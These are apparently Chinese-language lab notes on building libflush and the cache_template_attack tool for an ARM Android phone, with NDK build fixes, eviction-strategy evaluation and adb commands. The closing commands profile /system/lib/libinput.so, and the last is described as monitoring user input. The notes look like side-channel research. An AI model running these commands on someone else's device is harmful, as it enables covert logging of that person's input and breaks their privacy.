# 一些操作
向`/opt/android/ndk/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/lib/gcc/arm-linux-androideabi/4.9.x/include`文件夹中移动了`/libflush/libflush/armv7`文件夹以解决
```bash
 [CC] cache_template_attack/calibrate.c
cache_template_attack/calibrate.c:5:31: fatal error: libflush/libflush.h: No such file or directory
 #include <libflush/libflush.h>
                               ^
compilation terminated.
```
问题

在编译`cache_template_attack`的时候，删除上面添加的`.so.*`动态链接库，可以获得加入静态库可以直接在手机中执行的程序版本。

在编译libflush的时候在命令行中添加`DESTDIR`参数来安装库到制定的文件夹
```sh
make DESTDIR=/opt/android/ndk/platforms/android-23/arch-arm/ install
```

通过`cat /system/build.prop | grep product`来获得系统芯片信息。


```sh
eviction_strategy_evaluator -c conf.yml -x cancro.yml run_strategies -e 30 -a 10 -d 10 -n 10000
```

run_stategies时不用连接手机
命令为
```sh
eviction_strategy_evaluator -c conf.yml -x cancro.yml evaluate_strategies /home/larry/Documents/cancro -t 95
```


获得数据的命令行为
```sh
adb shell /data/local/tmp/input-simulator -r -1 -d 1 s &

adb shell /data/local/tmp/cache_template_attack -c 0 -r b6b19000-b6b33000 -o 000000000 -f 1 /system/lib/libinput.so -l /data/local/tmp/log/s.log

adb shell kill 'adb shell ps | grep input-simulator | grep input-simulator | awk '{print $2}'| head -1'
```
监测用户输入数据的命令为

```sh
adb shell /data/local/tmp/cache_template_attack -s -c 0 -r b6b19000-b6b33000 -o 00006480 -f 1 /system/lib/libinput.so -l /data/local/tmp/log/test.log
```

